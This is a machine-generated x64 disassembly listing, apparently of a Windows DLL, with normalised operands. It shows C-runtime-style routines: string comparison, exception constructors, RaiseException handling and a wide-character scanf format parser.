jne r-xdata
mov rdx rcx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_18000e06c
jmp r-xdata
test rcx rcx
je r-xdata
sub_1800132b0
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180013360
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov rdi rdx
mov [ rcx ] rax
mov rcx [ rdx ]
test rcx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
call sub_1800174b0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_18000e0ac
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
mov rsi [ rsp + 0x38 ]
mov [ rbx + 0x10 ] 0x1
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov r8 [ rdi ]
lea rdx [ rsi + 0x1 ]
mov rcx rax
call sub_18001695c
jmp r-xdata
sub_1800133f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rdx
mov rbx rcx
mov [ rcx ] rax
mov eax [ rdx + 0x10 ]
mov [ rcx + 0x10 ] eax
test eax eax
je r-xdata
mov rax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rcx [ rdx + 0x8 ]
test rcx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
jmp r-xdata
call sub_1800174b0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_18000e0ac
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov r8 [ rdi + 0x8 ]
lea rdx [ rsi + 0x1 ]
mov rcx rax
call sub_18001695c
jmp r-xdata
sub_1800134a8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180013470
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_1800134e0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180013514
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_1800160e0
lea rdx [ rsp + 0x70 ]
mov rcx rdi
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x58 ] rax
test rdi rdi
je r-xdata
mov r8d [ rsp + 0x38 ]
mov edx [ rsp + 0x24 ]
mov ecx [ rsp + 0x20 ]
lea r9 [ rsp + 0x40 ]
call [ RaiseException@IAT ]
mov rbx [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rsp + 0x40 ]
test r11 r11
cmove eax ecx
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x40 ] ecx
jmp r-xdata
sub_1800135c4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rcx [ rdx ]
jne r-xdata
mov eax 0x1
cmp [ r8 ] r9
jne r-xdata
mov rdx [ rdx ]
mov rcx [ rdi ]
mov r8d 0x4
call sub_18001161c
test rax rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x4
call sub_180011510
mov [ rdi ] rax
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rdi ] rax
mov rcx [ rbx ]
add rcx rcx
mov [ rbx ] rcx
mov rax [ rsp + 0x50 ]
mov rdx rsi
mov [ rax ] 0x1
mov r8 [ rbx ]
mov rcx [ rdi ]
add r8 r8
call sub_1800160e0
mov r11 [ rbx ]
add r11 r11
mov [ rbx ] r11
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180013660
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov rdi rcx
mov rsi [ rsp + 0x38 ]
mov ax bx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx 0x8
movzx ecx bx
call sub_18001a0c0
test eax eax
jne r-xdata
inc [ rdi ]
mov rcx rsi
call sub_18001aaf4
movzx ebx ax
mov eax 0xffff
cmp bx ax
je r-xdata
sub_1800136b0
mov r11 rsp
mov [ r11 + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x3c0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x3b0 ] rax
xor r14d r14d
lea rbp [ r11 - 0x308 ]
mov [ rsp + 0xb8 ] r9
mov eax r14d
mov si r14w
mov rbx rdx
mov [ rsp + 0x60 ] rdx
mov rdi rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0xb0 ] eax
mov [ rsp + 0x38 ] esi
mov [ r11 - 0x368 ] rbp
mov [ r11 - 0x350 ] 0x15e
mov [ r11 - 0x360 ] r14d
mov [ rsp + 0x68 ] r14
cmp rdx r14
jne r-xdata
cmp rcx r14
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r14
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
lea rcx [ rsp + 0xc8 ]
mov rdx r8
call sub_18000d428
movzx eax [ rbx ]
mov [ rsp + 0x3c ] r14b
mov r15d r14d
mov [ rsp + 0x30 ] r14d
mov [ rsp + 0x40 ] r14d
mov r12d r14d
mov [ rsp + 0x78 ] r14d
cmp ax r14w
je r-xdata
mov rcx [ rsp + 0x3b0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x410 ]
add rsp 0x3c0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rsp + 0xe0 ] r14b
je r-xdata
mov ebp 0x25
mov r12d 0xffff
lea r13d [ rbp - 0x24 ]
mov eax r12d
mov rcx [ rsp + 0xd8 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov r10 [ rsp + 0x60 ]
cmp bp [ r10 ]
jne r-xdata
lea rcx [ rsp + 0x40 ]
sub r15d r13d
mov rdx rdi
mov [ rsp + 0x40 ] r15d
call sub_180013660
cmp r12w ax
je r-xdata
add r15d r13d
mov rcx rdi
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_18001aaf4
mov rbx [ rsp + 0x60 ]
mov si ax
movzx eax [ rbx ]
add rbx 0x2
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x60 ] rbx
cmp ax si
jne r-xdata
cmp bp [ r10 + 0x2 ]
je r-xdata
add rbx 0x2
mov edx 0x8
movzx ecx [ rbx ]
call sub_18001a0c0
cmp eax r14d
jne r-xdata
mov rdx rdi
movzx ecx ax
call sub_18001acec
cmp r12w si
je r-xdata
cmp r12w si
jne r-xdata
cmp bp [ r10 ]
jne r-xdata
xor r8d r8d
mov r12w r14w
mov edx r14d
lea r9d [ r8 + 0x1 ]
mov [ rsp + 0x54 ] r14d
mov [ rsp + 0x58 ] r14d
mov [ rsp + 0xb4 ] r12d
mov r13d r14d
mov [ rsp + 0x8c ] r14b
mov [ rsp + 0x44 ] r14b
mov sil r14b
mov dil r14b
mov [ rsp + 0xa0 ] r14d
mov [ rsp + 0x50 ] edx
mov bpl r8b
mov r14b r9b
mov r15d r8d
or r12d 0xffffffff
mov r15d [ rsp + 0x40 ]
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x30 ] r15d
jmp r-xdata
mov rbx [ rsp + 0x68 ]
xor ebp ebp
jmp r-xdata
mov rdx rdi
jmp r-xdata
mov ax [ rbx ]
cmp ax r14w
je r-xdata
cmp [ rbx ] bp
jne r-xdata
lea rax [ r10 + 0x2 ]
cmp bp [ rax ]
cmove r10 rax
mov [ rsp + 0x60 ] r10
cmp ebx 0x2a
je r-xdata
movzx ecx bl
call sub_18001a9f0
mov edx [ rsp + 0x50 ]
mov r10 [ rsp + 0x60 ]
xor r8d r8d
lea r9d [ r8 + 0x1 ]
cmp eax r8d
je r-xdata
mov eax [ rsp + 0xb0 ]
mov edi 0x1
cmp eax edi
jne r-xdata
movzx ecx si
call sub_18001acec
jmp r-xdata
mov eax 0x6e
cmp [ rbx + 0x2 ] ax
jne r-xdata
add sil r9b
cmp ebx 0x46
je r-xdata
lea eax [ r13 + r13 * 4 ]
add edx r9d
lea r13d [ rbx + rax * 2 - 0x30 ]
mov [ rsp + 0x50 ] edx
jmp r-xdata
cmp [ rsp + 0x98 ] edi
jne r-xdata
mov rcx rbx
call sub_18000e06c
mov edx 0x8
movzx ecx ax
call sub_18001a0c0
cmp eax r14d
je r-xdata
add r10 0x2
mov eax 0xff00
movzx ebx [ r10 ]
mov [ rsp + 0x60 ] r10
test ax bx
jne r-xdata
mov r12d [ rsp + 0xb4 ]
mov [ rsp + 0x34 ] sil
mov esi [ rsp + 0x38 ]
mov cl [ rsp + 0x34 ]
mov [ rsp + 0x35 ] r14b
mov r14d [ rsp + 0xa0 ]
mov [ rsp + 0x48 ] r15d
mov r15b [ rsp + 0x8c ]
mov [ rsp + 0x4c ] r13d
cmp cl r8b
jne r-xdata
cmp dil r8b
je r-xdata
cmp ebx 0x49
je r-xdata
cmp r12w si
jne r-xdata
mov rcx [ rsp + 0x90 ]
call sub_18000e06c
mov [ rsp + 0xa0 ] r8
mov rax [ rsp + 0xb8 ]
mov [ rsp + 0xc0 ] rax
add rax 0x8
mov [ rsp + 0xb8 ] rax
mov rax [ rax - 0x8 ]
mov [ rsp + 0xa0 ] rax
jmp r-xdata
movzx eax [ r10 + 0x2 ]
cmp ax 0x36
jne r-xdata
cmp ebx 0x4c
je r-xdata
mov r12d [ rsp + 0x78 ]
xor r14d r14d
mov eax [ rsp + 0x78 ]
cmp eax ebp
jne r-xdata
movzx r13d [ r10 ]
mov r11d 0x6e
or r13d 0x20
cmp r13d r11d
je r-xdata
cmp [ r10 ] 0x53
je r-xdata
mov bl r8b
cmp bpl r8b
jne r-xdata
cmp ax 0x33
jne r-xdata
lea rcx [ r10 + 0x4 ]
cmp [ rcx ] 0x34
jne r-xdata
add r14b r9b
jmp r-xdata
cmp ebx 0x4e
je r-xdata
cmp [ rsp + 0xe0 ] bpl
je r-xdata
mov dl [ rsp + 0x3c ]
cmp dl bpl
jne r-xdata
mov edi [ rsp + 0x4c ]
cmp edx r8d
je r-xdata
cmp r13d 0x63
je r-xdata
mov bpl 0xff
cmp [ r10 ] 0x43
mov bpl r9b
jne r-xdata
mov ecx 0x64
cmp ax cx
je r-xdata
lea rcx [ r10 + 0x4 ]
cmp [ rcx ] 0x32
jne r-xdata
mov r10 rcx
mov [ rsp + 0x60 ] rcx
cmp ebx 0x68
je r-xdata
mov rcx [ rsp + 0xd8 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov eax 0x6f
cmp r13d eax
jg r-xdata
cmp edi r8d
je r-xdata
mov eax [ rsp + 0x30 ]
mov rcx [ rsp + 0x70 ]
add eax r9d
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x40 ] eax
call sub_18001aaf4
mov si ax
cmp r13d 0x7b
je r-xdata
add r15d r9d
mov [ rsp + 0x80 ] r8
jmp r-xdata
mov ecx 0x69
cmp ax cx
je r-xdata
mov r10 rcx
mov [ rsp + 0x60 ] rcx
jmp r-xdata
add r14b r12b
add bpl r12b
jmp r-xdata
mov ecx 0x6c
cmp ebx ecx
je r-xdata
cmp r13d 0x70
je r-xdata
je r-xdata
mov r12d 0xffff
cmp r12w si
je r-xdata
mov rbx [ rsp + 0x68 ]
xor ebp ebp
mov r12d eax
jmp r-xdata
mov r10 [ rsp + 0x60 ]
mov edx [ rsp + 0x50 ]
mov cl [ rsp + 0x34 ]
xor r8d r8d
lea r9d [ r8 + 0x1 ]
lea r11d [ r8 + 0x6e ]
mov rdx [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
call sub_180013660
mov si ax
mov eax [ rsp + 0x40 ]
mov [ rsp + 0x30 ] eax
jmp r-xdata
mov ecx 0x6f
cmp ax cx
je r-xdata
lea rax [ r10 + 0x2 ]
cmp [ rax ] cx
jne r-xdata
cmp ebx 0x77
je r-xdata
mov ebp [ rsp + 0x48 ]
mov [ rsp + 0x35 ] r9b
mov [ rsp + 0x80 ] r8
add ebp r9d
jmp r-xdata
cmp r13d 0x73
je r-xdata
mov ebp [ rsp + 0x48 ]
cmp r13d 0x63
je r-xdata
mov rdx [ rsp + 0x70 ]
mov eax 0xffff
mov [ rsp + 0x38 ] esi
cmp ax si
je r-xdata
mov ecx 0x78
cmp ax cx
je r-xdata
add r14b r9b
mov r10 rax
mov [ rsp + 0x60 ] rax
jmp r-xdata
add bpl r9b
jmp r-xdata
jmp r-xdata
mov eax 0x2d
cmp ax si
jne r-xdata
movzx r14d r14b
cmp bpl r8b
cmovg r14d r9d
cmp r13d 0x75
je r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov [ rsp + 0x44 ] r9b
jmp r-xdata
cmp edx r8d
jne r-xdata
mov eax 0x64
cmp r13d eax
je r-xdata
mov ecx 0x58
cmp ax cx
je r-xdata
add dil r9b
jmp r-xdata
mov ebp [ rsp + 0x50 ]
xor r8d r8d
mov rdx [ rsp + 0x70 ]
movzx ecx si
call sub_18001acec
mov ecx [ rsp + 0x30 ]
mov edx 0x1
mov eax 0x78
cmp r13d eax
je r-xdata
mov r14d [ rsp + 0x58 ]
sub edi r9d
mov [ rsp + 0x4c ] edi
jne r-xdata
cmp bpl r8b
jle r-xdata
mov [ rsp + 0x50 ] r9d
add edi r9d
jle r-xdata
add r15d r9d
mov [ rsp + 0x80 ] r8
add ecx edx
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x40 ] ecx
mov rcx [ rsp + 0x70 ]
call sub_18001aaf4
mov r8d 0xffff
mov si ax
mov [ rsp + 0x38 ] esi
cmp r8w ax
je r-xdata
mov eax edi
sub edi edx
cmp eax r8d
je r-xdata
mov eax 0x2d
cmp ax si
jne r-xdata
cmp r13d 0x7b
je r-xdata
cmp bl dil
mov ebx [ rsp + 0x54 ]
jne r-xdata
cmp bl dil
mov rbx [ rsp + 0x80 ]
jne r-xdata
mov r15d [ rsp + 0x30 ]
mov rcx [ rsp + 0x70 ]
add r15d r9d
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_18001aaf4
mov r14d [ rsp + 0x58 ]
mov si ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
cmp edx r8d
je r-xdata
mov ecx [ rsp + 0x30 ]
mov r12 [ rsp + 0xa0 ]
mov edx 0x1
sub ecx edx
mov eax 0xffff
mov rbx r12
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x40 ] ecx
cmp ax si
je r-xdata
mov r14b r9b
jmp r-xdata
cmp [ r10 ] si
jne r-xdata
cmp r13d 0x67
jle r-xdata
mov r15d [ rsp + 0x30 ]
mov edx 0x1
sub r15d edx
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp r8w si
je r-xdata
cmp r13d 0x63
je r-xdata
mov r15d [ rsp + 0x30 ]
jmp r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov [ rsp + 0x44 ] r9b
jmp r-xdata
cmp bpl r8b
movzx r14d r14b
mov eax 0x5e
cmovg r14d r9d
add r10 0x2
mov [ rsp + 0x60 ] r10
cmp ax [ r10 ]
jne r-xdata
xor r8d r8d
cmp [ rsp + 0x44 ] r8b
je r-xdata
mov r12d [ rsp + 0x4c ]
xor r8d r8d
cmp [ rsp + 0x44 ] r8b
je r-xdata
mov r12d [ rsp + 0x4c ]
xor edi edi
cmp ebp edi
je r-xdata
mov bl r9b
jmp r-xdata
mov dl [ rsp + 0x3c ]
mov r15d [ rsp + 0x30 ]
xor r14d r14d
dec dl
lea r13d [ r14 + 0x1 ]
mov [ rsp + 0x3c ] dl
cmp cl r14b
jne r-xdata
xor r14d r14d
mov rbx r14
lea ecx [ r14 + 0x2d ]
cmp cx si
jne r-xdata
cmp r13d 0x69
je r-xdata
xor r8d r8d
mov rdx [ rsp + 0x70 ]
movzx ecx si
call sub_18001acec
mov edx 0x1
xor r8d r8d
cmp [ rsp + 0x34 ] r8b
jne r-xdata
cmp r13d 0x73
jne r-xdata
cmp rbx r12
je r-xdata
mov r12 [ rsp + 0x70 ]
mov ebp [ rsp + 0x30 ]
sub edi r9d
mov [ rsp + 0x4c ] edi
jne r-xdata
mov rbx [ rsp + 0x68 ]
cmp rbx r8
jne r-xdata
add r10 0x2
mov r15b 0xff
mov [ rsp + 0x60 ] r10
cmp r13d 0x46
cmove r14d r8d
cmp r14d r8d
je r-xdata
neg ebx
mov [ rsp + 0x54 ] ebx
mov eax 0xff00
test ax si
jne r-xdata
cmp r13d 0x70
je r-xdata
neg rbx
mov [ rsp + 0x80 ] rbx
jmp r-xdata
mov eax 0xff00
test ax si
jne r-xdata
cmp r13d 0x70
je r-xdata
mov rbx [ rsp + 0x60 ]
add [ rsp + 0x3c ] r13b
mov rdi [ rsp + 0x70 ]
add rbx 0x2
mov ebp 0x25
mov r12d 0xffff
mov [ rsp + 0x60 ] rbx
jmp r-xdata
mov r9 [ rsp + 0xc0 ]
mov [ rsp + 0xb8 ] r9
jmp r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov rax [ rsp + 0x90 ]
mov rbx r9
mov [ rax ] cx
jmp r-xdata
mov r13d eax
cmp r13d r11d
jne r-xdata
mov rbx [ rsp + 0x68 ]
xor ebp ebp
cmp [ rsp + 0x34 ] r8b
jne r-xdata
add rbx 0x2
cmp r14b r8b
je r-xdata
cmp r13d 0x7b
jne r-xdata
cmp ax 0x9
jb r-xdata
mov ebp [ rsp + 0x48 ]
lea r15d [ rax - 0x2f ]
mov rcx r12
add ebp r15d
mov [ rsp + 0x30 ] ebp
mov [ rsp + 0x40 ] ebp
call sub_18001aaf4
mov si ax
lea eax [ r15 + 0x77 ]
mov [ rsp + 0x38 ] esi
cmp ax si
je r-xdata
mov ebp [ rsp + 0x30 ]
mov r12 [ rsp + 0x70 ]
add ebp r9d
mov rcx r12
mov [ rsp + 0x30 ] ebp
mov [ rsp + 0x40 ] ebp
call sub_18001aaf4
mov si ax
mov [ rsp + 0x38 ] esi
jmp r-xdata
cmp edx r8d
je r-xdata
xor ebp ebp
mov ecx 0x2000
call sub_1800114a4
xor ebp ebp
mov rbx rax
mov [ rsp + 0x68 ] rax
cmp rax rbp
je r-xdata
xor r14d r14d
lea r13d [ r14 + 0x1 ]
cmp [ rsp + 0x34 ] r14b
jne r-xdata
dec r15d
mov eax 0xffff
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp ax si
je r-xdata
movzx ebx si
movzx edi bl
mov ecx edi
call sub_18001aa70
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax 0xff00
test ax si
jne r-xdata
dec r15d
mov eax 0xffff
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp ax si
je r-xdata
movzx ebx si
movzx edi bl
mov ecx edi
call sub_18001aa70
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax 0xff00
test ax si
jne r-xdata
mov r15d [ rsp + 0x30 ]
mov r12 [ rsp + 0x70 ]
mov r12 [ rsp + 0x70 ]
mov r15d [ rsp + 0x30 ]
sub edi r9d
mov rcx r12
add r15d r9d
call sub_18001aaf4
mov edx [ rsp + 0x50 ]
mov si ax
mov [ rsp + 0x38 ] esi
jmp r-xdata
mov r15d [ rsp + 0x30 ]
xor r14d r14d
mov eax r15d
lea r13d [ r14 + 0x1 ]
cmp cl r14b
jne r-xdata
mov r13d 0x1
add [ rsp + 0x78 ] edx
cmp r13d 0x63
mov r13d 0x1
je r-xdata
cmp ebp r8d
je r-xdata
mov [ rsp + 0x4c ] r8d
lea rcx [ rsp + 0x4c ]
movzx r9d si
mov r8d 0x5
mov rdx r12
call sub_18001a9dc
xor r8d r8d
cmp eax r8d
je r-xdata
mov [ r12 ] si
add r12 0x2
jmp r-xdata
mov rcx [ rsp + 0x68 ]
movzx eax si
movzx edx si
shr rax 0x3
and edx 0x7
movsx ecx [ rax + rcx ]
movsx eax r15b
xor ecx eax
bt ecx edx
jae r-xdata
mov eax 0x20
cmp si ax
jne r-xdata
cmp ax 0xd
jbe r-xdata
add ebp r15d
mov rcx r12
mov [ rsp + 0x30 ] ebp
mov [ rsp + 0x40 ] ebp
call sub_18001aaf4
mov ebp [ rsp + 0x50 ]
xor ecx ecx
mov si ax
mov [ rsp + 0x38 ] esi
cmp ebp ecx
je r-xdata
lea ecx [ rax - 0x20 ]
cmp cx si
je r-xdata
mov eax 0x30
cmp ax si
jne r-xdata
mov bl r9b
movzx ecx [ r10 ]
cmp dx cx
je r-xdata
lea eax [ rdx - 0x3d ]
mov r12d edx
add r10 0x2
mov [ rbx + 0xb ] al
mov r12d 0xffff
lea eax [ rbp + 0x1 ]
mov [ rsp + 0xb0 ] eax
jmp r-xdata
add [ rsp + 0x78 ] r13d
mov eax [ rsp + 0x54 ]
jmp r-xdata
mov ebx [ rsp + 0x54 ]
mov rdx [ rsp + 0x70 ]
movzx ecx si
call sub_18001acec
mov eax [ rsp + 0x54 ]
mov ecx edi
shl eax 0x4
mov [ rsp + 0x54 ] eax
call sub_18001a9f0
xor edi edi
cmp eax edi
je r-xdata
movzx eax si
movzx ecx al
call sub_18001a9f0
cmp eax edi
je r-xdata
mov rbx [ rsp + 0x80 ]
mov rdx [ rsp + 0x70 ]
movzx ecx si
call sub_18001acec
shl [ rsp + 0x80 ] 0x4
mov ecx edi
call sub_18001a9f0
xor edi edi
cmp eax edi
je r-xdata
movzx eax si
movzx ecx al
call sub_18001a9f0
cmp eax edi
je r-xdata
mov eax 0x2e
lea r9 [ rsp + 0xc8 ]
lea rcx [ rsp + 0x88 ]
mov [ rsp + 0x88 ] ax
mov rax [ rsp + 0xc8 ]
mov rdx [ rax + 0x128 ]
movsxd r8 [ rax + 0x10c ]
mov rdx [ rdx ]
call sub_1800194ac
movzx r11d [ rsp + 0x88 ]
movsx eax sil
mov r13d 0x1
cmp r11d eax
jne r-xdata
lea r13d [ rax + 0x2 ]
cmp edx r14d
mov eax 0xffffffff
mov ebp 0xff00
cmove edi eax
test bp si
jne r-xdata
mov ebp [ rsp + 0x48 ]
xor r14d r14d
cmp r14b r8b
je r-xdata
movsxd rax [ rsp + 0x4c ]
add r12 rax
jmp r-xdata
cmp eax 0x16
je r-xdata
mov ecx [ rsp + 0x30 ]
mov edx 0x1
jmp r-xdata
mov ebp [ rsp + 0x48 ]
mov r14d [ rsp + 0x58 ]
mov eax 0x78
mov r13d eax
jmp r-xdata
sub edi 0x2
cmp edi r15d
mov [ rsp + 0x4c ] edi
jge r-xdata
mov r14d r15d
cmp r13d eax
je r-xdata
cmp [ r10 ] bp
je r-xdata
mov esi 0x2d
lea r11d [ rsi - 0x2c ]
xor edx edx
mov r8d 0x2000
mov rcx rbx
call sub_180016870
mov r10 [ rsp + 0x60 ]
mov edx 0x5d
cmp dx [ r10 ]
jne r-xdata
mov rcx [ rsp + 0xa0 ]
cmp ebp r14d
je r-xdata
mov esi 0xffdf
and si bx
sub si 0x7
mov si bx
jmp r-xdata
mov eax 0x6f
cmp r13d eax
jne r-xdata
mov esi 0xffdf
and si bx
sub si 0x7
mov si bx
jmp r-xdata
mov eax 0x6f
cmp r13d eax
jne r-xdata
mov ebp [ rsp + 0x58 ]
cmp ebp r14d
je r-xdata
mov eax edi
sub edi r13d
cmp eax r14d
je r-xdata
mov eax edi
sub edi r13d
cmp eax r14d
je r-xdata
cmp [ rsp + 0x35 ] r14b
je r-xdata
mov rax [ rsp + 0x80 ]
mov [ rcx ] rax
jmp r-xdata
xor r14d r14d
mov [ r12 ] r14b
jmp r-xdata
xor r14d r14d
mov [ r12 ] r14w
jmp r-xdata
xor r9d r9d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r8
call sub_18001063c
xor r8d r8d
jmp r-xdata
mov ecx [ rsp + 0x30 ]
lea edx [ r8 + 0x1 ]
cmp eax 0x22
jne r-xdata
mov r15d [ rsp + 0x30 ]
add bl r15b
sub ebp r15d
mov eax 0xffff
mov [ rsp + 0x30 ] ebp
mov [ rsp + 0x40 ] ebp
cmp ax si
je r-xdata
mov ebp [ rsp + 0x50 ]
xor ecx ecx
cmp ebp ecx
je r-xdata
mov [ rsp + 0x60 ] r10
jmp r-xdata
movzx eax cx
movzx r8d cx
mov edx r11d
and eax 0x7
mov r12w cx
shr r8 0x3
mov cl al
shl dl cl
or [ r8 + rbx ] dl
mov edx 0x5d
cmp r12w bp
je r-xdata
add r15d ecx
mov rcx [ rsp + 0x70 ]
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_18001aaf4
mov si ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
sub r12d ecx
je r-xdata
mov ebx [ rsp + 0x54 ]
mov [ rsp + 0x38 ] esi
lea eax [ rbx + rbx * 4 ]
lea ebx [ rax + rax ]
jmp r-xdata
mov eax 0x38
cmp ax si
jbe r-xdata
add r15d ecx
mov rcx [ rsp + 0x70 ]
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
call sub_18001aaf4
mov si ax
mov eax 0x78
mov [ rsp + 0x38 ] esi
jmp r-xdata
sub r12d ecx
je r-xdata
mov rbx [ rsp + 0x80 ]
mov [ rsp + 0x38 ] esi
lea rbx [ rbx + rbx * 4 ]
add rbx rbx
jmp r-xdata
mov eax 0x38
cmp ax si
jbe r-xdata
sub r15d r13d
mov eax 0xffff
mov [ rsp + 0x30 ] r15d
mov [ rsp + 0x40 ] r15d
cmp ax si
je r-xdata
mov ecx 0x65
cmp cx si
je r-xdata
mov rcx r12
add r15d r13d
call sub_18001aaf4
mov rcx [ rsp + 0x90 ]
lea r9 [ rsp + 0xf0 ]
mov si ax
movzx eax [ rsp + 0x88 ]
lea r8 [ rsp + 0x90 ]
mov [ rcx + rbx * 2 ] ax
lea rax [ rsp + 0x98 ]
add rbx r13
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
jne r-xdata
mov rcx [ rsp + 0x90 ]
add [ rsp + 0x58 ] r13d
movsx eax sil
mov [ rcx + rbx * 2 ] ax
lea rax [ rsp + 0x98 ]
add rbx r13
lea r9 [ rsp + 0xf0 ]
lea r8 [ rsp + 0x90 ]
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
je r-xdata
mov [ rcx ] ax
jmp r-xdata
mov [ rcx ] eax
jmp r-xdata
mov ebp [ rsp + 0x48 ]
mov eax 0x30
mov esi eax
mov [ rsp + 0x38 ] eax
jmp r-xdata
mov rdx r12
movzx ecx si
call sub_18001acec
mov ebp [ rsp + 0x48 ]
mov ecx 0x6f
mov r13d ecx
jmp r-xdata
sub edi r15d
mov [ rsp + 0x4c ] edi
jne r-xdata
add r10 0x2
cmp si cx
jne r-xdata
mov esi [ rsp + 0x38 ]
movzx eax [ r10 ]
cmp dx ax
je r-xdata
cmp r13d eax
je r-xdata
movzx eax si
mov ecx 0x1
lea ebx [ rbx + rax - 0x30 ]
add r14d ecx
mov [ rsp + 0x54 ] ebx
cmp [ rsp + 0x50 ] edi
je r-xdata
shl ebx 0x3
jmp r-xdata
cmp r13d eax
je r-xdata
movzx eax si
mov ecx 0x1
sub eax 0x30
add r14d ecx
cdqe
add rbx rax
mov [ rsp + 0x80 ] rbx
cmp [ rsp + 0x50 ] edi
je r-xdata
shl rbx 0x3
jmp r-xdata
cmp ebp r14d
je r-xdata
mov rdx r12
movzx ecx si
call sub_18001acec
mov eax edi
sub edi r13d
cmp eax r14d
je r-xdata
lea eax [ rcx - 0x20 ]
cmp ax si
jne r-xdata
test bp si
je r-xdata
mov rcx r12
add r15d r13d
call sub_18001aaf4
mov si ax
mov [ rsp + 0x38 ] esi
test bp ax
je r-xdata
